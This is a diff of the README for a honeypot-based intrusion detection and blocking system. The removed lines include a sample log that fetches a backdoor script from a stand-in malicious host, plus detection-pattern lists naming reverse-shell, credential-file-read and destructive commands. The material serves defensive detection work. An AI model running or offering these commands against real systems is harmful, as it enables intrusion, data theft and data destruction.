@@ -1,19 +1,20 @@
-# Digital Twin Honeynet for Adversary Fingerprinting
+# Digital Twin Honeynet for Adversarial Fingerprinting
 
-A sophisticated deception-based cybersecurity system that uses honeypot technology to detect, analyze, and automatically respond to malicious actors through behavioral analysis and automated firewall enforcement.
+A sophisticated deception-based cybersecurity system that uses honeypot technology to detect, analyze, and automatically respond to malicious actors through behavioral analysis and automated firewall enforcement. This system runs natively on Linux VMs without containerization.
 
 ## 🎯 Project Overview
 
-This system implements a **Digital Twin** approach where all incoming traffic is initially routed to a Cowrie SSH honeypot. A background Python service analyzes behavior patterns and intelligently redirects legitimate traffic to production servers while keeping malicious actors trapped in the honeypot environment.
+This system implements a **Digital Twin** approach where all incoming traffic is initially routed to honeypots (SSH, HTTP, RDP, SMB). A background Python service analyzes behavior patterns and intelligently redirects legitimate traffic to production servers while keeping malicious actors trapped in the honeypot environment.
 
 ### Core Features
 
-- **Deception Layer**: All traffic initially lands on Cowrie honeypot
+- **Multi-Protocol Honeypots**: SSH (Cowrie), HTTP, RDP, and SMB honeypots
 - **Behavioral Analysis**: Rule-based classification of legitimate vs malicious traffic
 - **Smart Redirection**: Legitimate traffic redirected to production via HAProxy
-- **Automated Response**: Malicious IPs blocked via nftables/ipset
+- **Automated Response**: Malicious IPs blocked via nftables/UFW
 - **Real-time Dashboard**: FastAPI-based monitoring interface
-- **Comprehensive Testing**: 4 different attack simulation scenarios
+- **Fingerprint Evasion**: Automatic testing and comparison of honeypot vs production fingerprints
+- **Centralized Configuration**: Single config.yaml for all services
 
 ## 🏗️ Architecture
 
@@ -31,8 +32,9 @@ This system implements a **Digital Twin** approach where all incoming traffic is
                     └─────────────┬─────────────┘
                                   │
                     ┌─────────────▼─────────────┐
-                    │    Cowrie SSH Honeypot    │
-                    │   (Initial Landing Zone)  │
+                    │   Multi-Protocol          │
+                    │   Honeypots               │
+                    │   (SSH, HTTP, RDP, SMB)   │
                     └─────────────┬─────────────┘
                                   │
                     ┌─────────────▼─────────────┐
@@ -55,23 +57,27 @@ This system implements a **Digital Twin** approach where all incoming traffic is
 
 ## 🛠️ Tech Stack
 
-- **Honeypot**: Cowrie SSH honeypot with JSON logging
+- **Honeypots**:
+  - SSH: Cowrie honeypot with JSON logging
+  - HTTP: nginx-based honeypot
+  - RDP: Custom RDP honeypot
+  - SMB: Custom SMB honeypot
 - **Load Balancer**: HAProxy for traffic redirection
-- **Backend**: Python FastAPI with watchdog and threading
-- **Firewall**: nftables + ipset integration
-- **Dashboard**: Jinja2 templates with FastAPI
-- **Virtualization**: VirtualBox VMs for isolation
-- **Logging**: JSON-based structured logging
+- **Backend**: Python FastAPI with PostgreSQL and Redis
+- **Firewall**: nftables + UFW integration
+- **Web Server**: nginx for HTTP honeypot and production server
+- **Database**: PostgreSQL for data storage
+- **Cache**: Redis for session management
+- **System Management**: systemd services for native deployment
 
 ## 📦 Installation & Setup
 
 ### Prerequisites
 
+- Ubuntu 20.04+ or Debian 11+ (Linux host)
 - Python 3.8+
-- VirtualBox 6.0+
-- Ubuntu 20.04+ (for honeypot VM)
-- nftables and ipset
-- HAProxy
+- Root/sudo access
+- Internet connection for package installation
 
 ### Quick Start
 
@@ -82,496 +88,430 @@ This system implements a **Digital Twin** approach where all incoming traffic is
    cd digital-twin-honeynet
    ```
 
-2. **Install dependencies**
+2. **Run automated installation**
 
    ```bash
-   pip install -r requirements.txt
+   sudo ./install_native_services.sh
    ```
 
-3. **Setup VirtualBox VMs**
+3. **Start all services**
 
    ```bash
-   # Create honeypot VM
-   VBoxManage createvm --name "honeypot-vm" --ostype Ubuntu_64 --register
-   VBoxManage modifyvm "honeypot-vm" --memory 2048 --cpus 2
-
-   # Create production VM
-   VBoxManage createvm --name "production-vm" --ostype Ubuntu_64 --register
-   VBoxManage modifyvm "production-vm" --memory 4096 --cpus 4
+   python controllers/honeynet_controller_native.py --action start
    ```
 
-4. **Configure HAProxy**
+4. **Check service status**
 
    ```bash
-   sudo cp utils/haproxy.cfg /etc/haproxy/
-   sudo systemctl restart haproxy
+   python honeynet_controller_native.py --action status
    ```
 
-5. **Start the system**
-   ```bash
-   python fastapi_backend/main.py
-   ```
+## 🔧 Service Configuration
 
-## 🧪 Test Scenarios
+### Service Locations
 
-### TC1: Legitimate Access (No False Positives)
+| Service             | Installation Path                     | Config Path                                           | Log Path                              |
+| ------------------- | ------------------------------------- | ----------------------------------------------------- | ------------------------------------- |
+| Cowrie SSH Honeypot | `/opt/honeynet/services/ssh-honeypot` | `/opt/honeynet/services/ssh-honeypot/cowrie.cfg`      | `/var/log/honeynet/cowrie.log`        |
+| HTTP Honeypot       | nginx site                            | `/etc/nginx/sites-available/honeypot`                 | `/var/log/honeynet/http-honeypot.log` |
+| RDP Honeypot        | `/opt/honeynet/services/rdp-honeypot` | `/opt/honeynet/services/rdp-honeypot/rdp_config.yaml` | `/var/log/honeynet/rdp-honeypot.log`  |
+| SMB Honeypot        | `/opt/honeynet/services/smb-honeypot` | `/opt/honeynet/services/smb-honeypot/smb_config.yaml` | `/var/log/honeynet/smb-honeypot.log`  |
+| Production Server   | nginx site                            | `/etc/nginx/sites-available/production`               | `/var/log/honeynet/production.log`    |
+| API Backend         | `/opt/honeynet/services/api-backend`  | `/opt/honeynet/config/config.yaml`                    | `/var/log/honeynet/api.log`           |
+| HAProxy             | system package                        | `/etc/haproxy/haproxy.cfg`                            | `/var/log/haproxy.log`                |
+| PostgreSQL          | system package                        | `/etc/postgresql/*/main/postgresql.conf`              | `/var/log/postgresql/`                |
+| Redis               | system package                        | `/etc/redis/redis.conf`                               | `/var/log/redis/`                     |
 
-```bash
-python simulator/simulate_attacker1.py --mode legitimate --user admin --password correct_password
-```
+### Service Management
 
-**Expected Result**: Traffic redirected to production server, no alerts
-
-### TC2: Boundary Value Analysis (Slight Deviation)
-
-```bash
-python simulator/simulate_attacker2.py --mode bva --attempts 4 --delay 2
-```
-
-**Expected Result**: Traffic allowed but logged for monitoring
-
-### TC3: Anomalous Timing Pattern
+#### Using the Native Controller
 
 ```bash
-python simulator/simulate_attacker3.py --mode timing --burst 3 --interval 0.1
+# Start all services
+python honeynet_controller_native.py --action start
+
+# Stop all services
+python honeynet_controller_native.py --action stop
+
+# Restart all services
+python honeynet_controller_native.py --action restart
+
+# Check service status
+python honeynet_controller_native.py --action status
+
+# Validate service configuration
+python honeynet_controller_native.py --action validate
+
+# Configure services based on config.yaml
+python honeynet_controller_native.py --action configure
 ```
 
-**Expected Result**: Soft alert generated, traffic monitored
-
-### TC4: Brute Force Attack
+#### Using systemd Directly
 
 ```bash
-python simulator/simulate_attacker4.py --mode brute-force --attempts 10 --delay 0.5
+# Start individual services
+sudo systemctl start cowrie
+sudo systemctl start rdp-honeypot
+sudo systemctl start smb-honeypot
+sudo systemctl start honeynet-api
+sudo systemctl start honeynet-monitor
+sudo systemctl start haproxy
+sudo systemctl start nginx
+
+# Check service status
+sudo systemctl status cowrie
+sudo systemctl status rdp-honeypot
+sudo systemctl status smb-honeypot
+
+# Enable services to start on boot
+sudo systemctl enable cowrie
+sudo systemctl enable rdp-honeypot
+sudo systemctl enable smb-honeypot
 ```
 
-**Expected Result**: IP blocked, attack logged, honeypot engagement
+#### Using Helper Scripts
 
-## 📊 Dashboard Features
+```bash
+# Start all services
+sudo /opt/honeynet/scripts/start_honeynet.sh
 
-Access the dashboard at `http://localhost:8000`
+# Stop all services
+sudo /opt/honeynet/scripts/stop_honeynet.sh
 
-### Real-time Statistics
-
-- **Blocked IPs**: Count and list of blocked addresses
-- **Redirections**: Legitimate traffic redirects to production
-- **Alerts**: Security alerts and their severity levels
-- **Traffic Analysis**: Incoming vs redirected traffic patterns
-- **System Health**: Honeypot and firewall status
-
-### Log Samples
-
-#### Legitimate Access Log
-
-```json
-{
-  "timestamp": "2024-01-15T10:30:15Z",
-  "src_ip": "192.168.1.100",
-  "event": "login_success",
-  "username": "admin",
-  "classification": "legitimate",
-  "action": "redirect_to_production",
-  "session_id": "leg_001"
-}
+# Check status
+/opt/honeynet/scripts/status_honeynet.sh
 ```
 
-#### Malicious Access Log
+### Testing Services
 
-```json
-{
-  "timestamp": "2024-01-15T10:35:22Z",
-  "src_ip": "10.0.0.50",
-  "event": "brute_force_detected",
-  "attempts": 15,
-  "timeframe": "60s",
-  "classification": "malicious",
-  "action": "block_ip",
-  "firewall_rule": "nft add rule ip filter input ip saddr 10.0.0.50 drop"
-}
+```bash
+# Test HTTP honeypot
+curl http://localhost:8080
+
+# Test production server
+curl http://localhost:8081
+
+# Test SSH honeypot
+ssh -p 2222 honeynet@localhost
+
+# Test RDP honeypot (requires RDP client)
+# Connect to localhost:3389
+
+# Test SMB honeypot (requires SMB client)
+smbclient //localhost/honeypot -p 445
+
+# Test API backend
+curl http://localhost:8000/health
 ```
+
+## 🌐 Network Configuration
+
+### Port Mappings
+
+| External Port | Internal Service  | Description                        |
+| ------------- | ----------------- | ---------------------------------- |
+| 80            | HAProxy           | Main entry point for HTTP traffic  |
+| 443           | HAProxy           | HTTPS traffic (if configured)      |
+| 8080          | HTTP Honeypot     | Direct access to HTTP honeypot     |
+| 8081          | Production Server | Direct access to production server |
+| 2222          | SSH Honeypot      | SSH honeypot (Cowrie)              |
+| 3389          | RDP Honeypot      | RDP honeypot                       |
+| 445           | SMB Honeypot      | SMB honeypot                       |
+| 139           | SMB Honeypot      | SMB honeypot (NetBIOS)             |
+| 8000          | API Backend       | FastAPI backend                    |
+| 5432          | PostgreSQL        | Database (internal)                |
+| 6379          | Redis             | Cache (internal)                   |
+
+### Firewall Configuration
+
+The installation script configures:
+
+- **nftables**: Advanced packet filtering and NAT
+- **UFW**: Uncomplicated firewall for basic rules
+- **HAProxy**: Load balancing and traffic routing
+- **Network isolation**: Honeynet traffic separated from production
+
+### Routing Logic
+
+1. **HAProxy** receives all incoming traffic on port 80
+2. **Access Control**: Checks IP whitelist/blacklist and user agent patterns
+3. **Attack Detection**: Identifies suspicious patterns (SQLi, XSS, etc.)
+4. **Routing Decision**:
+   - **Legitimate traffic** → Production server (port 8081)
+   - **Suspicious traffic** → HTTP honeypot (port 8080)
+   - **Blacklisted traffic** → Blocked or honeypot
+
+## 📊 Monitoring & Logging
+
+### Log Locations
+
+- **Honeypot logs**: `/var/log/honeynet/`
+- **System logs**: `/var/log/syslog`
+- **HAProxy logs**: `/var/log/haproxy.log`
+- **Database logs**: `/var/log/postgresql/`
+- **Redis logs**: `/var/log/redis/`
+
+### Monitoring Dashboard
+
+Access the monitoring dashboard at: `http://localhost:8000`
+
+Features:
+
+- Real-time attack statistics
+- Service health monitoring
+- Log analysis and visualization
+- Configuration management
+- Fingerprint comparison results
+
+### Log Analysis
+
+```bash
+# View honeypot logs
+tail -f /var/log/honeynet/cowrie.log
+tail -f /var/log/honeynet/http-honeypot.log
+tail -f /var/log/honeynet/rdp-honeypot.log
+tail -f /var/log/honeynet/smb-honeypot.log
+
+# View system logs
+journalctl -u cowrie -f
+journalctl -u rdp-honeypot -f
+journalctl -u smb-honeypot -f
+```
+
+## 🔍 Fingerprint Evasion Testing
+
+### Running Fingerprint Tests
+
+```bash
+# Basic fingerprint test
+python tests/fingerprint_test.py
+
+# Test with specific targets
+python tests/fingerprint_test.py --honeypot localhost --production localhost
+
+# Generate detailed report
+python tests/fingerprint_test.py --output report.json
+
+# Demo mode (no external tools required)
+python tests/test_fingerprint_evasion.py
+```
+
+### What Gets Tested
+
+- **Nmap scans**: OS detection, service versions, open ports
+- **p0f analysis**: Passive OS fingerprinting
+- **TCP options**: Window size, MSS, TTL, flags
+- **Service banners**: HTTP, SSH, RDP, SMB responses
+- **Protocol handshakes**: Connection establishment patterns
+
+### Similarity Scoring
+
+The system calculates a weighted similarity score based on:
+
+- OS fingerprint (30%)
+- Service banners (25%)
+- TCP options (20%)
+- Port responses (15%)
+- Protocol behavior (10%)
 
 ## 🔧 Configuration
 
-### Honeypot Configuration (`honeypot/cowrie.cfg`)
+### Central Configuration
 
-```ini
-[output_jsonlog]
-enabled = true
-logfile = logs/cowrie.json
+All settings are managed in `config.yaml`:
 
-[ssh]
-enabled = true
-port = 2222
-version = SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
+```yaml
+# Protocol configurations
+protocols:
+  ssh:
+    enabled: true
+    port: 2222
+    banner: "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5"
+
+  http:
+    enabled: true
+    port: 8080
+    banner: "nginx/1.18.0 (Ubuntu)"
+
+# Access control
+access_control:
+  whitelist:
+    ips: ["127.0.0.1", "192.168.1.0/24"]
+    user_agents: ["legitimate-bot", "monitoring-agent"]
+
+  blacklist:
+    ips: ["192.168.1.200"]
+    user_agents: ["sqlmap", "nikto", "nmap"]
+
+# Network fingerprinting
+network_fingerprinting:
+  tcp_randomization:
+    enabled: true
+    ttl_variation: 5
+    window_size_variation: 1000
 ```
 
-### Behavioral Analysis Rules (`fastapi_backend/config.py`)
+### Service-Specific Configuration
 
-```python
-BEHAVIOR_RULES = {
-    'brute_force_threshold': 5,      # Failed attempts
-    'brute_force_window': 60,        # Time window (seconds)
-    'legitimate_delay_min': 1.0,     # Minimum delay between attempts
-    'legitimate_delay_max': 5.0,     # Maximum delay between attempts
-    'suspicious_patterns': ['admin', 'root', 'test'],  # Suspicious usernames
-    'redirect_whitelist': ['192.168.1.0/24']  # Trusted networks
-}
-```
+Each service has its own configuration files:
 
-## 🚀 Usage Examples
+- **Cowrie**: `/opt/honeynet/services/ssh-honeypot/cowrie.cfg`
+- **HTTP Honeypot**: `/etc/nginx/sites-available/honeypot`
+- **RDP Honeypot**: `/opt/honeynet/services/rdp-honeypot/rdp_config.yaml`
+- **SMB Honeypot**: `/opt/honeynet/services/smb-honeypot/smb_config.yaml`
+- **HAProxy**: `/etc/haproxy/haproxy.cfg`
 
-### Starting the System
-
-```bash
-# Start the FastAPI backend
-python fastapi_backend/main.py
-
-# In another terminal, start log monitoring
-python fastapi_backend/log_monitor.py
-
-# Access dashboard
-curl http://localhost:8000/dashboard
-```
-
-### Running Attack Simulations
-
-```bash
-# Test legitimate access
-python simulator/simulate_attacker1.py --mode legitimate
-
-# Test boundary conditions
-python simulator/simulate_attacker2.py --mode bva
-
-# Test timing anomalies
-python simulator/simulate_attacker3.py --mode timing
-
-# Test brute force
-python simulator/simulate_attacker4.py --mode brute-force
-```
-
-### Monitoring and Management
-
-```bash
-# View blocked IPs
-curl http://localhost:8000/api/blocked
-
-# Check system status
-curl http://localhost:8000/api/status
-
-# View recent logs
-curl http://localhost:8000/api/logs
-```
-
-## 🔒 Security Features
-
-### Behavioral Analysis
-
-- **Timing Analysis**: Detects rapid-fire login attempts
-- **Pattern Recognition**: Identifies common attack patterns
-- **Geographic Analysis**: Flags suspicious source locations
-- **Session Tracking**: Monitors user session behavior
-
-### Automated Response
-
-- **IP Blocking**: Automatic firewall rule generation
-- **Traffic Redirection**: Smart routing based on classification
-- **Alert Generation**: Real-time security notifications
-- **Log Correlation**: Cross-reference multiple data sources
-
-### Deception Techniques
-
-- **Honeypot Engagement**: Keeps attackers in controlled environment
-- **False Credentials**: Decoy accounts for attack analysis
-- **Simulated Services**: Fake production-like responses
-- **Behavioral Profiling**: Tracks attacker TTPs
-
-## 📈 Performance Metrics
-
-### System Performance
-
-- **Response Time**: < 100ms for traffic classification
-- **Throughput**: 1000+ requests/second
-- **Accuracy**: 99.5% legitimate traffic identification
-- **False Positive Rate**: < 0.1%
-
-### Security Metrics
-
-- **Detection Rate**: 95% of malicious attempts
-- **Blocking Speed**: < 5 seconds from detection to block
-- **Coverage**: 100% of incoming traffic analyzed
-- **Retention**: 30 days of detailed logs
-
-## 🛡️ Best Practices
-
-### Deployment
-
-- Use dedicated VMs for honeypot and production
-- Implement network segmentation
-- Regular backup of configuration and logs
-- Monitor system resources and performance
-
-### Maintenance
-
-- Update Cowrie honeypot regularly
-- Review and tune behavioral rules
-- Analyze false positives and adjust thresholds
-- Keep firewall rules current
-
-### Security
-
-- Use strong authentication for dashboard access
-- Encrypt sensitive log data
-- Implement rate limiting on API endpoints
-- Regular security audits and penetration testing
-
-## 📄 Cowrie Log Monitoring
-
-The `cowrie_log_monitor.py` script provides real-time monitoring of Cowrie honeypot logs and automatically blocks malicious IPs by integrating with the FastAPI server.
-
-### Purpose
-
-- **Real-time Log Monitoring**: Watches Cowrie log files for new entries using watchdog
-- **Malicious Activity Detection**: Identifies brute force attacks, suspicious commands, reverse shells, and data exfiltration
-- **Automatic IP Blocking**: Sends malicious IPs to the FastAPI `/block` endpoint for immediate firewall blocking
-- **Comprehensive Logging**: Maintains detailed logs of all detected activities and blocking actions
-
-### How to Run
-
-#### Basic Usage
-```bash
-# Start monitoring with default settings
-python cowrie_log_monitor.py
-
-# Test API connectivity
-python cowrie_log_monitor.py --test
-
-# Show current statistics
-python cowrie_log_monitor.py --stats
-```
-
-#### Custom Configuration
-```bash
-# Specify custom log path and API endpoint
-python cowrie_log_monitor.py \
-  --log-path /var/log/cowrie/cowrie.json \
-  --api-url http://192.168.1.100 \
-  --api-port 8000
-```
-
-#### Environment Variables
-```bash
-# Set environment variables
-export COWRIE_LOG_PATH="honeypot/logs/cowrie.json"
-export FASTAPI_URL="http://localhost:8000"
-export FASTAPI_PORT="8000"
-
-# Run monitor
-python cowrie_log_monitor.py
-```
-
-### Example Output
-
-#### Normal Operation
-```
-2024-01-15 10:30:15 - INFO - Cowrie log monitor initialized
-2024-01-15 10:30:15 - INFO - Monitoring: honeypot/logs/cowrie.json
-2024-01-15 10:30:15 - INFO - API endpoint: http://localhost:8000/api/block
-2024-01-15 10:30:15 - INFO - Started monitoring log directory: honeypot/logs
-2024-01-15 10:30:15 - INFO - Processing existing log file...
-```
-
-#### Malicious Activity Detection
-```
-2024-01-15 10:35:22 - WARNING - Brute force detected: 203.0.113.10 - 8 attempts
-2024-01-15 10:35:22 - WARNING - Malicious activity detected: brute_force from 203.0.113.10
-2024-01-15 10:35:23 - INFO - Successfully blocked IP 203.0.113.10 for brute_force
-
-2024-01-15 10:40:15 - WARNING - Suspicious command detected: wget http://malicious.com/backdoor.sh
-2024-01-15 10:40:15 - WARNING - Malicious activity detected: suspicious_command from 198.51.100.20
-2024-01-15 10:40:16 - INFO - Successfully blocked IP 198.51.100.20 for suspicious_command
-```
-
-### Sample Log and Triggering IP
-
-#### Cowrie Log Entry (Triggers Block)
-```json
-{
-  "eventid": "cowrie.login.failed",
-  "timestamp": "2024-01-15T10:35:22.123456Z",
-  "src_ip": "203.0.113.10",
-  "username": "admin",
-  "password": "password123",
-  "session": "session_001",
-  "message": "Login attempt failed"
-}
-```
-
-#### Block Request Sent to FastAPI
-```json
-{
-  "ip": "203.0.113.10",
-  "reason": "Cowrie detected brute_force",
-  "source": "cowrie_log_monitor",
-  "timestamp": "2024-01-15T10:35:23.000000Z",
-  "log_entry": {
-    "eventid": "cowrie.login.failed",
-    "timestamp": "2024-01-15T10:35:22.123456Z",
-    "src_ip": "203.0.113.10",
-    "username": "admin",
-    "password": "password123",
-    "session": "session_001",
-    "message": "Login attempt failed"
-  }
-}
-```
-
-### Detection Patterns
-
-The monitor detects the following malicious activities:
-
-#### Brute Force Attacks
-- **Pattern**: Multiple failed login attempts from same IP
-- **Threshold**: 5 failed attempts within 60 seconds
-- **Action**: Immediate IP blocking
-
-#### Suspicious Commands
-- **Patterns**: `wget`, `curl`, `nc`, `netcat`, `telnet`, `ssh-keygen`
-- **Dangerous Commands**: `rm -rf`, `dd if=`, `mkfs`, `fdisk`, `shutdown`, `reboot`
-- **Action**: Immediate IP blocking
-
-#### Reverse Shells
-- **Patterns**: `bash -i >&`, `nc -e`, `python -c`, `perl -e`, `ruby -rsocket`
-- **Action**: Immediate IP blocking
-
-#### Data Exfiltration
-- **Patterns**: `cat /etc/passwd`, `cat /etc/shadow`, `uname -a`, `whoami`, `ps aux`
-- **Action**: Immediate IP blocking
-
-#### File Operations
-- **Patterns**: `wget http://`, `curl -O`, `scp`, `rsync`
-- **Action**: Immediate IP blocking
-
-### Integration with Existing System
-
-The Cowrie Log Monitor integrates seamlessly with the existing Digital Twin Honeynet system:
-
-1. **Independent Operation**: Runs as a separate background process
-2. **FastAPI Integration**: Uses existing `/api/block` endpoint
-3. **Firewall Integration**: Leverages existing nftables/ipset infrastructure
-4. **Dashboard Integration**: Blocked IPs appear in the main dashboard
-5. **Logging Integration**: All activities logged to system logs
-
-### Monitoring and Management
-
-#### Check Monitor Status
-```bash
-# View monitor statistics
-python cowrie_log_monitor.py --stats
-
-# Test API connectivity
-python cowrie_log_monitor.py --test
-
-# Check monitor logs
-tail -f logs/cowrie_monitor.log
-```
-
-#### Systemd Service (Optional)
-```bash
-# Create systemd service for automatic startup
-sudo cp cowrie_log_monitor.py /usr/local/bin/
-sudo chmod +x /usr/local/bin/cowrie_log_monitor.py
-
-# Create service file
-sudo tee /etc/systemd/system/cowrie-monitor.service << EOF
-[Unit]
-Description=Cowrie Log Monitor
-After=network.target honeynet-api.service
-
-[Service]
-Type=simple
-User=honeynet
-WorkingDirectory=/path/to/honeynet
-Environment=COWRIE_LOG_PATH=honeypot/logs/cowrie.json
-Environment=FASTAPI_URL=http://localhost:8000
-ExecStart=/usr/local/bin/cowrie_log_monitor.py
-Restart=always
-RestartSec=10
-
-[Install]
-WantedBy=multi-user.target
-EOF
-
-# Enable and start service
-sudo systemctl enable cowrie-monitor
-sudo systemctl start cowrie-monitor
-```
-
-## 🔍 Troubleshooting
+## 🚨 Troubleshooting
 
 ### Common Issues
 
-1. **HAProxy not redirecting traffic**
+1. **Service won't start**
 
    ```bash
-   sudo systemctl status haproxy
-   sudo tail -f /var/log/haproxy.log
+   # Check service status
+   sudo systemctl status <service-name>
+
+   # View logs
+   sudo journalctl -u <service-name> -f
+
+   # Check configuration
+   python controllers/honeynet_controller_native.py --action validate
    ```
 
-2. **Cowrie not logging**
+2. **Port conflicts**
 
    ```bash
-   sudo systemctl status cowrie
-   tail -f honeypot/logs/cowrie.json
+   # Check what's using a port
+   sudo netstat -tlnp | grep :<port>
+
+   # Kill process using port
+   sudo fuser -k <port>/tcp
    ```
 
-3. **Firewall rules not applying**
+3. **Permission issues**
 
    ```bash
+   # Fix permissions
+   sudo chown -R honeynet:honeynet /opt/honeynet
+   sudo chmod -R 755 /opt/honeynet
+   ```
+
+4. **Database connection issues**
+
+   ```bash
+   # Check PostgreSQL status
+   sudo systemctl status postgresql
+
+   # Test connection
+   sudo -u postgres psql -c "SELECT version();"
+   ```
+
+### Performance Tuning
+
+1. **Increase log rotation**
+
+   ```bash
+   # Edit logrotate configuration
+   sudo nano /etc/logrotate.d/honeynet
+   ```
+
+2. **Optimize database**
+
+   ```bash
+   # Tune PostgreSQL
+   sudo nano /etc/postgresql/*/main/postgresql.conf
+   ```
+
+3. **Adjust firewall rules**
+   ```bash
+   # Review nftables rules
    sudo nft list ruleset
-   sudo ipset list
    ```
 
-4. **Dashboard not accessible**
-   ```bash
-   curl http://localhost:8000/health
-   check firewall rules for port 8000
-   ```
+## 🔒 Security Considerations
 
-5. **Cowrie Log Monitor not working**
+### Network Security
 
-   ```bash
-   # Test API connectivity
-   python cowrie_log_monitor.py --test
-   
-   # Check log file permissions
-   ls -la honeypot/logs/cowrie.json
-   
-   # Verify FastAPI server is running
-   curl http://localhost:8000/health
-   
-   # Check monitor logs
-   tail -f logs/cowrie_monitor.log
-   ```
+- All services run on isolated network interfaces
+- Firewall rules block unauthorized access
+- Honeypot traffic is completely separated from production
+- Regular security updates are applied
 
-## 📚 Additional Resources
+### Access Control
 
-- [Cowrie Documentation](https://github.com/cowrie/cowrie)
-- [HAProxy Configuration Guide](https://www.haproxy.org/download/1.8/doc/configuration.txt)
-- [nftables User Guide](https://wiki.nftables.org/wiki-nftables/index.php/Main_Page)
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
+- Services run under dedicated `honeynet` user
+- File permissions are restricted
+- Database access is limited
+- API endpoints are protected
+
+### Monitoring
+
+- All access attempts are logged
+- Suspicious activity triggers alerts
+- Regular security audits are performed
+- Backup and recovery procedures are in place
+
+## 📁 Repository Structure
+
+```
+digital-twin-honeynet/
+├── controllers/              # Service management and controllers
+│   ├── honeynet_controller.py
+│   ├── honeynet_controller_native.py
+│   └── setup_honeynet.sh
+├── honeypots/                # Honeypot configurations and scripts
+│   ├── http_honeypot.py
+│   ├── rdp_honeypot.py
+│   ├── smb_honeypot.py
+│   ├── http_router.py
+│   ├── cowrie_integration_script.py
+│   ├── cowrie_patch.py
+│   ├── *.yaml                # Protocol-specific configurations
+│   └── *.py                  # Honeypot implementations
+├── router/                   # HAProxy configuration
+│   └── haproxy.cfg
+├── backend/                  # FastAPI app + DB integration
+│   ├── main.py
+│   ├── config.py
+│   └── templates/
+├── logs/                     # Log monitoring scripts
+│   └── cowrie_log_monitor.py
+├── utils/                    # Utility modules
+│   ├── config_loader.py
+│   └── network_router.py
+├── tests/                    # Test files
+│   ├── fingerprint_test.py
+│   └── *.py                  # Other test files
+├── simulator/                # Attack simulation scripts
+├── config.yaml              # Central configuration
+├── install_native_services.sh     # Installation script
+├── start_honeynet.py        # Startup script
+├── requirements.txt         # Python dependencies
+├── env.example              # Environment variables template
+└── README.md               # This file
+```
 
 ## 🤝 Contributing
 
 1. Fork the repository
 2. Create a feature branch
 3. Make your changes
-4. Add tests for new functionality
+4. Test thoroughly
 5. Submit a pull request
 
+## 📄 License
 
-## ⚠️ Disclaimer
+This project is licensed under the MIT License - see the LICENSE file for details.
 
-This tool is for educational and research purposes only. Use responsibly and in accordance with applicable laws and regulations. The authors are not responsible for any misuse of this software.
+## 🆘 Support
+
+For issues and questions:
+
+1. Check the troubleshooting section
+2. Review the logs
+3. Open an issue on GitHub
+4. Contact the maintainers
 
 ---
 
-**Digital Twin Honeynet for Adversary Fingerprinting** - Advanced deception-based cybersecurity system for threat detection and response.
+**⚠️ Warning**: This system is designed for research and educational purposes. Use in production environments at your own risk.
